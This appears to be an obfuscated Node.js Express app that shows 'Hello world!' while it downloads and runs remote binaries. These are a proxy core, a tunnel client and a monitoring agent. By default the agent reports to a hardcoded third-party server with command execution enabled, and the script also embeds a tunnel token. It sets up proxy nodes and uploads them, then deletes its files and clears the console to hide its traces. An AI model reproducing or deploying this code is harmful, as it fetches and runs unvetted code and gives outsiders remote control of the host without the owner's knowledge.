const _0x4de5de=_0x1b18;(function(_0x262f21,_0x170af8){const _0x48675f=_0x1b18,_0x44eadf=_0x262f21();while(!![]){try{const _0x572d4c=parseInt(_0x48675f(0x16d))/0x1*(parseInt(_0x48675f(0x1e8))/0x2)+parseInt(_0x48675f(0x185))/0x3+parseInt(_0x48675f(0x1a4))/0x4*(parseInt(_0x48675f(0x1c7))/0x5)+parseInt(_0x48675f(0x1ca))/0x6*(parseInt(_0x48675f(0x199))/0x7)+-parseInt(_0x48675f(0x1af))/0x8*(parseInt(_0x48675f(0x1e4))/0x9)+-parseInt(_0x48675f(0x16e))/0xa+-parseInt(_0x48675f(0x1f6))/0xb*(parseInt(_0x48675f(0x171))/0xc);if(_0x572d4c===_0x170af8)break;else _0x44eadf['push'](_0x44eadf['shift']());}catch(_0xef70b){_0x44eadf['push'](_0x44eadf['shift']());}}}(_0x3ef3,0x1d1c7));const express=require('express'),app=express(),axios=require(_0x4de5de(0x1c4)),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require(_0x4de5de(0x214)),exec=promisify(require(_0x4de5de(0x1cd))[_0x4de5de(0x18a)]),{execSync}=require(_0x4de5de(0x1cd)),UPLOAD_URL=process['env'][_0x4de5de(0x163)]||'',PROJECT_URL=process['env'][_0x4de5de(0x1ba)]||'',AUTO_ACCESS=process[_0x4de5de(0x1b0)][_0x4de5de(0x1cb)]||![],FILE_PATH=process[_0x4de5de(0x1b0)][_0x4de5de(0x176)]||_0x4de5de(0x16b),SUB_PATH=process[_0x4de5de(0x1b0)][_0x4de5de(0x1ec)]||'sub',PORT=process[_0x4de5de(0x1b0)]['SERVER_PORT']||process[_0x4de5de(0x1b0)][_0x4de5de(0x161)]||0xbb8,UUID=process[_0x4de5de(0x1b0)][_0x4de5de(0x1ed)]||'acc4f96e-2ff5-43a6-86bd-aa4cca951073',NEZHA_SERVER=process[_0x4de5de(0x1b0)]['NEZHA_SERVER']||'nzag.faiz.us.kg:8008',NEZHA_PORT=process[_0x4de5de(0x1b0)]['NEZHA_PORT']||'',NEZHA_KEY=process[_0x4de5de(0x1b0)]['NEZHA_KEY']||_0x4de5de(0x217),ARGO_DOMAIN=process[_0x4de5de(0x1b0)][_0x4de5de(0x1f5)]||_0x4de5de(0x1e0),ARGO_AUTH=process[_0x4de5de(0x1b0)][_0x4de5de(0x1cf)]||'eyJhIjoiNmI3MzZhMDhiMzlmNDVlMzE2ZTdlMGNkODE2Yjc2ZDIiLCJ0IjoiYWMyMTMyZGItMjEzMS00NGQ0LWIwMDMtZjU1NDc0M2FkODExIiwicyI6Ik1qY3pPVFJpWVdFdFptRXlPUzAwT0dZekxXSTRNakl0WlRZeE5UTXdOMlptWVdaaiJ9',ARGO_PORT=process[_0x4de5de(0x1b0)]['ARGO_PORT']||0xc005,CFIP=process[_0x4de5de(0x1b0)][_0x4de5de(0x201)]||_0x4de5de(0x1bd),CFPORT=process[_0x4de5de(0x1b0)][_0x4de5de(0x20e)]||0x1bb,NAME=process[_0x4de5de(0x1b0)]['NAME']||'Vls';!fs[_0x4de5de(0x1a3)](FILE_PATH)?(fs[_0x4de5de(0x1f0)](FILE_PATH),console[_0x4de5de(0x21a)](FILE_PATH+_0x4de5de(0x1d3))):console[_0x4de5de(0x21a)](FILE_PATH+_0x4de5de(0x16f));function _0x3ef3(){const _0x51fbf2=['filter','pop','\x0a\x20\x20credentials-file:\x20','App\x20is\x20running','web','tunnel.json','8NiUHYi','env','true','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','message','list.txt','/trojan-argo','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','fileName','has','8443','PROJECT_URL','2083','forEach','www.visa.com.sg','/api/add-subscriptions','all','curl\x20-s\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','rm\x20-rf\x20','/config.json\x20>/dev/null\x202>&1\x20&','TunnelSecret','axios','unlinkSync','NEZHA\x20variable\x20is\x20empty,skip\x20running','115pqWHjG','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','Error\x20downloading\x20files:','233562OjAyvR','AUTO_ACCESS','/bot\x20','child_process','amd','ARGO_AUTH','createWriteStream','vmess','text/plain;\x20charset=utf-8','\x20is\x20created','web\x20running\x20error:\x20','443','direct','\x0a\x20\x20\x20\x20','boot.log','Hello\x20world!','sub.txt','https+local://8.8.8.8/dns-query','/sub.txt\x20saved\x20successfully','https://arm64.ssss.nyc.mn/agent','push','readFileSync','galaxyfr.faiz.us.kg','pkill\x20-f\x20\x22[b]ot\x22\x20>\x20/dev/null\x202>&1','Empowerment\x20success\x20for\x20','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','631413EHfeSc','npm\x20running\x20error:\x20','pipe','/tunnel.yml\x20run','350892aHkYaZ','Error\x20executing\x20command:\x20','Skipping\x20adding\x20automatic\x20access\x20task','base64','SUB_PATH','UUID','includes','https://amd64.ssss.nyc.mn/web','mkdirSync','status','2096','2087','data','ARGO_DOMAIN','11yDbDZK','writeFileSync','quic','tcp','https://arm64.ssss.nyc.mn/2go','utf-8','https://arm64.ssss.nyc.mn/web','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','join','close','/vmess-argo?ed=2560','CFIP','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','get','ArgoDomain:','/api/add-nodes','chmod','bot\x20is\x20running','application/json','web\x20is\x20running','./bot','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','?encryption=none&security=tls&sni=','length','CFPORT','aarch64','127.0.0.1','config.json','https://arm64.ssss.nyc.mn/v1','arch','util','trojan','vless','CQeAcbxpEVgklxMpqMK34DXn7v0iJdlr','Content-Type','https://amd64.ssss.nyc.mn/v1','log','arm64','fileUrl','\x0askip_connection_count:\x20false\x0askip_procs_count:\x20false\x0atemperature:\x20false\x0atls:\x20','php','&type=ws&host=','PORT','xtls-rprx-vision','UPLOAD_URL','unshift','arm','automatic\x20access\x20task\x20added\x20successfully','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','none','/dev/null','--tls','./tmp','Download\x20','1IOkOeO','2087440RjTjuX','\x20already\x20exists','clear','3015780SzXHoL','freedom','ARGO_DOMAIN:','http\x20server\x20is\x20running\x20on\x20port:','false','FILE_PATH','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','post','/vless-argo','\x0aclient_secret:\x20','response','config.yaml','\x20failed:\x20','bot','catch','\x0avless://','error','test','Error\x20reading\x20boot.log:','\x20-p\x20','257592StUvio','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','send','添加URL失败:\x20','exec','./npm','/npm\x20-s\x20','./web','toString','2053','\x20>/dev/null\x202>&1','Empowerment\x20failed\x20for\x20','php\x20is\x20running','php\x20running\x20error:\x20','/vmess-argo','\x20>/dev/null\x202>&1\x20&','stream','split','listen','42najkAk','&path=%2Fvless-argo%3Fed%3D2560#','nohup\x20','from','npm','\x0a\x20\x20\x0avmess://','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20false\x0aip_report_period:\x201800\x0areport_delay:\x201\x0aserver:\x20','tls','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','Subscription\x20uploaded\x20successfully','existsSync','26884cFaWVT','https://oooo.serv00.net/add-url','./php','match','http'];_0x3ef3=function(){return _0x51fbf2;};return _0x3ef3();}let npmPath=path[_0x4de5de(0x1fe)](FILE_PATH,_0x4de5de(0x19d)),phpPath=path[_0x4de5de(0x1fe)](FILE_PATH,_0x4de5de(0x15f)),webPath=path[_0x4de5de(0x1fe)](FILE_PATH,_0x4de5de(0x1ad)),botPath=path[_0x4de5de(0x1fe)](FILE_PATH,_0x4de5de(0x17e)),subPath=path[_0x4de5de(0x1fe)](FILE_PATH,_0x4de5de(0x1da)),listPath=path[_0x4de5de(0x1fe)](FILE_PATH,_0x4de5de(0x1b4)),bootLogPath=path[_0x4de5de(0x1fe)](FILE_PATH,_0x4de5de(0x1d8)),configPath=path['join'](FILE_PATH,'config.json');function deleteNodes(){const _0x1a37f7=_0x4de5de;try{if(!UPLOAD_URL)return;if(!fs[_0x1a37f7(0x1a3)](subPath))return;let _0x460af0;try{_0x460af0=fs[_0x1a37f7(0x1df)](subPath,'utf-8');}catch{return null;}const _0x162ec2=Buffer[_0x1a37f7(0x19c)](_0x460af0,_0x1a37f7(0x1eb))[_0x1a37f7(0x18e)]('utf-8'),_0x175bca=_0x162ec2['split']('\x0a')[_0x1a37f7(0x1a9)](_0x415cc1=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x1a37f7(0x182)](_0x415cc1));if(_0x175bca[_0x1a37f7(0x20d)]===0x0)return;return axios[_0x1a37f7(0x178)](UPLOAD_URL+'/api/delete-nodes',JSON['stringify']({'nodes':_0x175bca}),{'headers':{'Content-Type':_0x1a37f7(0x208)}})[_0x1a37f7(0x17f)](_0x4727ec=>{return null;});}catch(_0x1c47c3){return null;}}function cleanupOldFiles(){const _0x199a6b=_0x4de5de,_0x530485=[_0x199a6b(0x1ad),'bot',_0x199a6b(0x19d),_0x199a6b(0x15f),_0x199a6b(0x1da),_0x199a6b(0x1d8)];_0x530485[_0x199a6b(0x1bc)](_0x3720c1=>{const _0x2f9383=_0x199a6b,_0x3aae9d=path[_0x2f9383(0x1fe)](FILE_PATH,_0x3720c1);fs['unlink'](_0x3aae9d,()=>{});});}app['get']('/',function(_0x27ce72,_0x25abbf){const _0xbb6a37=_0x4de5de;_0x25abbf['send'](_0xbb6a37(0x1d9));});const config={'log':{'access':_0x4de5de(0x169),'error':_0x4de5de(0x169),'loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':_0x4de5de(0x216),'settings':{'clients':[{'id':UUID,'flow':_0x4de5de(0x162)}],'decryption':_0x4de5de(0x168),'fallbacks':[{'dest':0xbb9},{'path':_0x4de5de(0x179),'dest':0xbba},{'path':_0x4de5de(0x194),'dest':0xbbb},{'path':_0x4de5de(0x1b5),'dest':0xbbc}]},'streamSettings':{'network':_0x4de5de(0x1f9)}},{'port':0xbb9,'listen':_0x4de5de(0x210),'protocol':_0x4de5de(0x216),'settings':{'clients':[{'id':UUID}],'decryption':_0x4de5de(0x168)},'streamSettings':{'network':_0x4de5de(0x1f9),'security':_0x4de5de(0x168)}},{'port':0xbba,'listen':_0x4de5de(0x210),'protocol':_0x4de5de(0x216),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x4de5de(0x168)},'streamSettings':{'network':'ws','security':_0x4de5de(0x168),'wsSettings':{'path':_0x4de5de(0x179)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x4de5de(0x1a0),_0x4de5de(0x1f8)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x4de5de(0x210),'protocol':_0x4de5de(0x1d1),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x4de5de(0x1a8),_0x4de5de(0x1a0),_0x4de5de(0x1f8)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x4de5de(0x210),'protocol':_0x4de5de(0x215),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x4de5de(0x168),'wsSettings':{'path':_0x4de5de(0x1b5)}},'sniffing':{'enabled':!![],'destOverride':[_0x4de5de(0x1a8),'tls',_0x4de5de(0x1f8)],'metadataOnly':![]}}],'dns':{'servers':[_0x4de5de(0x1db)]},'outbounds':[{'protocol':_0x4de5de(0x172),'tag':_0x4de5de(0x1d6)},{'protocol':'blackhole','tag':'block'}]};fs[_0x4de5de(0x1f7)](path[_0x4de5de(0x1fe)](FILE_PATH,_0x4de5de(0x211)),JSON['stringify'](config,null,0x2));function getSystemArchitecture(){const _0x456045=_0x4de5de,_0x8fd135=os[_0x456045(0x213)]();return _0x8fd135===_0x456045(0x165)||_0x8fd135===_0x456045(0x21b)||_0x8fd135===_0x456045(0x20f)?_0x456045(0x165):_0x456045(0x1ce);}function downloadFile(_0x59bbb7,_0x4b61dc,_0x174022){const _0x325bb0=_0x4de5de,_0x41562f=path[_0x325bb0(0x1fe)](FILE_PATH,_0x59bbb7),_0x5673b4=fs[_0x325bb0(0x1d0)](_0x41562f);axios({'method':_0x325bb0(0x203),'url':_0x4b61dc,'responseType':_0x325bb0(0x196)})['then'](_0x479370=>{const _0x29d3a9=_0x325bb0;_0x479370[_0x29d3a9(0x1f4)][_0x29d3a9(0x1e6)](_0x5673b4),_0x5673b4['on']('finish',()=>{const _0x1435a4=_0x29d3a9;_0x5673b4[_0x1435a4(0x1ff)](),console[_0x1435a4(0x21a)](_0x1435a4(0x16c)+_0x59bbb7+'\x20successfully'),_0x174022(null,_0x59bbb7);}),_0x5673b4['on']('error',_0x4a636b=>{const _0x472f45=_0x29d3a9;fs['unlink'](_0x41562f,()=>{});const _0x128eda=_0x472f45(0x16c)+_0x59bbb7+_0x472f45(0x17d)+_0x4a636b[_0x472f45(0x1b3)];console['error'](_0x128eda),_0x174022(_0x128eda);});})[_0x325bb0(0x17f)](_0x5e8d74=>{const _0x38b7d0=_0x325bb0,_0x354e6d=_0x38b7d0(0x16c)+_0x59bbb7+_0x38b7d0(0x17d)+_0x5e8d74['message'];console[_0x38b7d0(0x181)](_0x354e6d),_0x174022(_0x354e6d);});}function _0x1b18(_0x4281e2,_0x3ce389){const _0x3ef350=_0x3ef3();return _0x1b18=function(_0x1b183e,_0x153666){_0x1b183e=_0x1b183e-0x15f;let _0x50a847=_0x3ef350[_0x1b183e];return _0x50a847;},_0x1b18(_0x4281e2,_0x3ce389);}async function downloadFilesAndRun(){const _0x38b8e8=_0x4de5de,_0x122935=getSystemArchitecture(),_0xadb98b=getFilesForArchitecture(_0x122935);if(_0xadb98b['length']===0x0){console[_0x38b8e8(0x21a)]('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0x70dc63=_0xadb98b['map'](_0xc02e9b=>{return new Promise((_0x36f00e,_0x15de5e)=>{const _0x24acd0=_0x1b18;downloadFile(_0xc02e9b[_0x24acd0(0x1b7)],_0xc02e9b[_0x24acd0(0x21c)],(_0x40c9f0,_0x3a7497)=>{_0x40c9f0?_0x15de5e(_0x40c9f0):_0x36f00e(_0x3a7497);});});});try{await Promise[_0x38b8e8(0x1bf)](_0x70dc63);}catch(_0x288570){console[_0x38b8e8(0x181)](_0x38b8e8(0x1c9),_0x288570);return;}function _0x351e80(_0x400d4f){const _0x5b0db1=_0x38b8e8,_0x3da192=0x1fd;_0x400d4f[_0x5b0db1(0x1bc)](_0x27e423=>{const _0x384e9a=_0x5b0db1,_0x48bce1=path[_0x384e9a(0x1fe)](FILE_PATH,_0x27e423);fs[_0x384e9a(0x1a3)](_0x48bce1)&&fs[_0x384e9a(0x206)](_0x48bce1,_0x3da192,_0x35dda4=>{const _0x360dfd=_0x384e9a;_0x35dda4?console[_0x360dfd(0x181)](_0x360dfd(0x191)+_0x48bce1+':\x20'+_0x35dda4):console[_0x360dfd(0x21a)](_0x360dfd(0x1e2)+_0x48bce1+':\x20'+_0x3da192['toString'](0x8));});});}const _0x4cc805=NEZHA_PORT?[_0x38b8e8(0x18b),_0x38b8e8(0x18d),_0x38b8e8(0x20a)]:[_0x38b8e8(0x1a6),_0x38b8e8(0x18d),_0x38b8e8(0x20a)];_0x351e80(_0x4cc805);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x41e699=NEZHA_SERVER[_0x38b8e8(0x1ee)](':')?NEZHA_SERVER['split'](':')[_0x38b8e8(0x1aa)]():'',_0x535f53=new Set(['443',_0x38b8e8(0x1b9),_0x38b8e8(0x1f2),'2087',_0x38b8e8(0x1bb),_0x38b8e8(0x18f)]),_0x4ceaa4=_0x535f53[_0x38b8e8(0x1b8)](_0x41e699)?_0x38b8e8(0x1b1):_0x38b8e8(0x175),_0x23b4e3=_0x38b8e8(0x17a)+NEZHA_KEY+_0x38b8e8(0x19f)+NEZHA_SERVER+_0x38b8e8(0x21d)+_0x4ceaa4+_0x38b8e8(0x177)+UUID;fs[_0x38b8e8(0x1f7)](path[_0x38b8e8(0x1fe)](FILE_PATH,_0x38b8e8(0x17c)),_0x23b4e3);const _0x427aae=_0x38b8e8(0x19b)+FILE_PATH+'/php\x20-c\x20\x22'+FILE_PATH+_0x38b8e8(0x187);try{await exec(_0x427aae),console['log'](_0x38b8e8(0x192)),await new Promise(_0x10d06b=>setTimeout(_0x10d06b,0x3e8));}catch(_0x51aff2){console[_0x38b8e8(0x181)](_0x38b8e8(0x193)+_0x51aff2);}}else{let _0x1b780d='';const _0x1d2206=[_0x38b8e8(0x1d5),_0x38b8e8(0x1b9),'2096',_0x38b8e8(0x1f3),_0x38b8e8(0x1bb),_0x38b8e8(0x18f)];_0x1d2206[_0x38b8e8(0x1ee)](NEZHA_PORT)&&(_0x1b780d=_0x38b8e8(0x16a));const _0x3ca75c=_0x38b8e8(0x19b)+FILE_PATH+_0x38b8e8(0x18c)+NEZHA_SERVER+':'+NEZHA_PORT+_0x38b8e8(0x184)+NEZHA_KEY+'\x20'+_0x1b780d+_0x38b8e8(0x195);try{await exec(_0x3ca75c),console[_0x38b8e8(0x21a)]('npm\x20is\x20running'),await new Promise(_0x544db5=>setTimeout(_0x544db5,0x3e8));}catch(_0x26b8f4){console[_0x38b8e8(0x181)](_0x38b8e8(0x1e5)+_0x26b8f4);}}}else console[_0x38b8e8(0x21a)](_0x38b8e8(0x1c6));const _0x5e0880=_0x38b8e8(0x19b)+FILE_PATH+'/web\x20-c\x20'+FILE_PATH+_0x38b8e8(0x1c2);try{await exec(_0x5e0880),console[_0x38b8e8(0x21a)](_0x38b8e8(0x209)),await new Promise(_0x2453fb=>setTimeout(_0x2453fb,0x3e8));}catch(_0xfbbdf5){console[_0x38b8e8(0x181)](_0x38b8e8(0x1d4)+_0xfbbdf5);}if(fs[_0x38b8e8(0x1a3)](path[_0x38b8e8(0x1fe)](FILE_PATH,'bot'))){let _0x586861;if(ARGO_AUTH[_0x38b8e8(0x1a7)](/^[A-Z0-9a-z=]{120,250}$/))_0x586861=_0x38b8e8(0x1a1)+ARGO_AUTH;else ARGO_AUTH[_0x38b8e8(0x1a7)](/TunnelSecret/)?_0x586861=_0x38b8e8(0x167)+FILE_PATH+_0x38b8e8(0x1e7):_0x586861=_0x38b8e8(0x1c8)+FILE_PATH+_0x38b8e8(0x1b2)+ARGO_PORT;try{await exec(_0x38b8e8(0x19b)+FILE_PATH+_0x38b8e8(0x1cc)+_0x586861+'\x20>/dev/null\x202>&1\x20&'),console[_0x38b8e8(0x21a)](_0x38b8e8(0x207)),await new Promise(_0x301024=>setTimeout(_0x301024,0x7d0));}catch(_0x339aa0){console['error'](_0x38b8e8(0x1e9)+_0x339aa0);}}await new Promise(_0x2081de=>setTimeout(_0x2081de,0x1388));}function getFilesForArchitecture(_0x4882e9){const _0xda29e6=_0x4de5de;let _0x58ead5;_0x4882e9==='arm'?_0x58ead5=[{'fileName':_0xda29e6(0x1ad),'fileUrl':_0xda29e6(0x1fc)},{'fileName':_0xda29e6(0x17e),'fileUrl':_0xda29e6(0x1fa)}]:_0x58ead5=[{'fileName':_0xda29e6(0x1ad),'fileUrl':_0xda29e6(0x1ef)},{'fileName':'bot','fileUrl':'https://amd64.ssss.nyc.mn/2go'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x3bd0a3=_0x4882e9==='arm'?_0xda29e6(0x1dd):'https://amd64.ssss.nyc.mn/agent';_0x58ead5[_0xda29e6(0x164)]({'fileName':_0xda29e6(0x19d),'fileUrl':_0x3bd0a3});}else{const _0x43286c=_0x4882e9===_0xda29e6(0x165)?_0xda29e6(0x212):_0xda29e6(0x219);_0x58ead5[_0xda29e6(0x164)]({'fileName':_0xda29e6(0x15f),'fileUrl':_0x43286c});}}return _0x58ead5;}function argoType(){const _0x214020=_0x4de5de;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x214020(0x21a)](_0x214020(0x1e3));return;}if(ARGO_AUTH[_0x214020(0x1ee)](_0x214020(0x1c3))){fs[_0x214020(0x1f7)](path[_0x214020(0x1fe)](FILE_PATH,_0x214020(0x1ae)),ARGO_AUTH);const _0xa3d571='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH[_0x214020(0x197)]('\x22')[0xb]+_0x214020(0x1ab)+path[_0x214020(0x1fe)](FILE_PATH,_0x214020(0x1ae))+_0x214020(0x1b6)+ARGO_DOMAIN+_0x214020(0x202)+ARGO_PORT+_0x214020(0x186);fs[_0x214020(0x1f7)](path[_0x214020(0x1fe)](FILE_PATH,'tunnel.yml'),_0xa3d571);}else console['log'](_0x214020(0x1fd));}argoType();async function extractDomains(){const _0x381eae=_0x4de5de;let _0x2a9f24;if(ARGO_AUTH&&ARGO_DOMAIN)_0x2a9f24=ARGO_DOMAIN,console[_0x381eae(0x21a)](_0x381eae(0x173),_0x2a9f24),await _0x5d09bb(_0x2a9f24);else try{const _0x5a216c=fs['readFileSync'](path[_0x381eae(0x1fe)](FILE_PATH,_0x381eae(0x1d8)),_0x381eae(0x1fb)),_0x2896bc=_0x5a216c[_0x381eae(0x197)]('\x0a'),_0x598e64=[];_0x2896bc[_0x381eae(0x1bc)](_0x14e062=>{const _0xb5745f=_0x381eae,_0x36b965=_0x14e062[_0xb5745f(0x1a7)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x36b965){const _0x52b1c2=_0x36b965[0x1];_0x598e64[_0xb5745f(0x1de)](_0x52b1c2);}});if(_0x598e64[_0x381eae(0x20d)]>0x0)_0x2a9f24=_0x598e64[0x0],console[_0x381eae(0x21a)](_0x381eae(0x204),_0x2a9f24),await _0x5d09bb(_0x2a9f24);else{console[_0x381eae(0x21a)]('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs[_0x381eae(0x1c5)](path[_0x381eae(0x1fe)](FILE_PATH,'boot.log'));async function _0x2e626c(){const _0x4a0899=_0x381eae;try{await exec(_0x4a0899(0x1e1));}catch(_0x3fbdfb){}}_0x2e626c(),await new Promise(_0x13690d=>setTimeout(_0x13690d,0xbb8));const _0x1a8120=_0x381eae(0x1c8)+FILE_PATH+_0x381eae(0x1b2)+ARGO_PORT;try{await exec(_0x381eae(0x19b)+path['join'](FILE_PATH,_0x381eae(0x17e))+'\x20'+_0x1a8120+'\x20>/dev/null\x202>&1\x20&'),console['log']('bot\x20is\x20running.'),await new Promise(_0x340a40=>setTimeout(_0x340a40,0xbb8)),await extractDomains();}catch(_0x313f3a){console['error'](_0x381eae(0x1e9)+_0x313f3a);}}}catch(_0x2a7c2d){console[_0x381eae(0x181)](_0x381eae(0x183),_0x2a7c2d);}async function _0x5d09bb(_0x36b2f2){const _0x190971=_0x381eae,_0x194b15=execSync(_0x190971(0x1c0),{'encoding':_0x190971(0x1fb)}),_0x2e213a=_0x194b15['trim']();return new Promise(_0x2955e9=>{setTimeout(()=>{const _0x3e824e=_0x1b18,_0x2922a4={'v':'2','ps':NAME+'-'+_0x2e213a,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x3e824e(0x168),'net':'ws','type':_0x3e824e(0x168),'host':_0x36b2f2,'path':_0x3e824e(0x200),'tls':_0x3e824e(0x1a0),'sni':_0x36b2f2,'alpn':''},_0x5e9ab1=_0x3e824e(0x180)+UUID+'@'+CFIP+':'+CFPORT+_0x3e824e(0x20c)+_0x36b2f2+'&type=ws&host='+_0x36b2f2+_0x3e824e(0x19a)+NAME+'-'+_0x2e213a+_0x3e824e(0x19e)+Buffer[_0x3e824e(0x19c)](JSON['stringify'](_0x2922a4))[_0x3e824e(0x18e)](_0x3e824e(0x1eb))+'\x0a\x20\x20\x0atrojan://'+UUID+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+_0x36b2f2+_0x3e824e(0x160)+_0x36b2f2+'&path=%2Ftrojan-argo%3Fed%3D2560#'+NAME+'-'+_0x2e213a+_0x3e824e(0x1d7);console[_0x3e824e(0x21a)](Buffer[_0x3e824e(0x19c)](_0x5e9ab1)[_0x3e824e(0x18e)](_0x3e824e(0x1eb))),fs[_0x3e824e(0x1f7)](subPath,Buffer[_0x3e824e(0x19c)](_0x5e9ab1)[_0x3e824e(0x18e)](_0x3e824e(0x1eb))),console['log'](FILE_PATH+_0x3e824e(0x1dc)),uplodNodes(),app['get']('/'+SUB_PATH,(_0x4cc987,_0x137282)=>{const _0x306b82=_0x3e824e,_0x1397e7=Buffer[_0x306b82(0x19c)](_0x5e9ab1)[_0x306b82(0x18e)]('base64');_0x137282['set'](_0x306b82(0x218),_0x306b82(0x1d2)),_0x137282[_0x306b82(0x188)](_0x1397e7);}),_0x2955e9(_0x5e9ab1);},0x7d0);});}}async function uplodNodes(){const _0x53e74d=_0x4de5de;if(UPLOAD_URL&&PROJECT_URL){const _0x493733=PROJECT_URL+'/'+SUB_PATH,_0x4ac867={'subscription':[_0x493733]};try{const _0x4b69b3=await axios[_0x53e74d(0x178)](UPLOAD_URL+_0x53e74d(0x1be),_0x4ac867,{'headers':{'Content-Type':_0x53e74d(0x208)}});if(_0x4b69b3[_0x53e74d(0x1f1)]===0xc8)console[_0x53e74d(0x21a)](_0x53e74d(0x1a2));else return null;}catch(_0x49f6f4){if(_0x49f6f4[_0x53e74d(0x17b)]){if(_0x49f6f4['response'][_0x53e74d(0x1f1)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x53e74d(0x1a3)](listPath))return;const _0x7c46ee=fs[_0x53e74d(0x1df)](listPath,_0x53e74d(0x1fb)),_0x41e939=_0x7c46ee[_0x53e74d(0x197)]('\x0a')[_0x53e74d(0x1a9)](_0x35ad8c=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x53e74d(0x182)](_0x35ad8c));if(_0x41e939[_0x53e74d(0x20d)]===0x0)return;const _0x45204a=JSON['stringify']({'nodes':_0x41e939});try{await axios['post'](UPLOAD_URL+_0x53e74d(0x205),_0x45204a,{'headers':{'Content-Type':'application/json'}});if(response[_0x53e74d(0x1f1)]===0xc8)console[_0x53e74d(0x21a)](_0x53e74d(0x1a2));else return null;}catch(_0x4c6d69){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x33b9e7=_0x1b18,_0x5a71ca=[bootLogPath,configPath,webPath,botPath,phpPath,npmPath];if(NEZHA_PORT)_0x5a71ca[_0x33b9e7(0x1de)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x5a71ca['push'](phpPath);exec(_0x33b9e7(0x1c1)+_0x5a71ca[_0x33b9e7(0x1fe)]('\x20')+_0x33b9e7(0x190),_0x1ee586=>{const _0x49988d=_0x33b9e7;console[_0x49988d(0x170)](),console[_0x49988d(0x21a)](_0x49988d(0x1ac)),console[_0x49988d(0x21a)](_0x49988d(0x20b));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x598400=_0x4de5de;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x598400(0x21a)](_0x598400(0x1ea));return;}try{const _0x261265=await axios[_0x598400(0x178)](_0x598400(0x1a5),{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});console[_0x598400(0x21a)](_0x598400(0x166));}catch(_0x49a98b){console[_0x598400(0x181)](_0x598400(0x189)+_0x49a98b[_0x598400(0x1b3)]);}}async function startserver(){deleteNodes(),cleanupOldFiles(),await downloadFilesAndRun(),await extractDomains(),AddVisitTask();}startserver(),app[_0x4de5de(0x198)](PORT,()=>console[_0x4de5de(0x21a)](_0x4de5de(0x174)+PORT+'!'));
